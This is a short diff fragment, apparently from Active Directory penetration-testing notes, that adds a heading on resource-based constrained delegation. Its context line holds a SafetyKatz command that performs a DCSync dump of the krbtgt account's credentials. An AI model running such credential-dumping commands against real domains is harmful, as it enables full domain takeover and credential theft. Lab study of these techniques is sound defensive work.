@@ -472,3 +472,6 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 
 
 
+# **Resource-based Constrained Delegation**
+
+
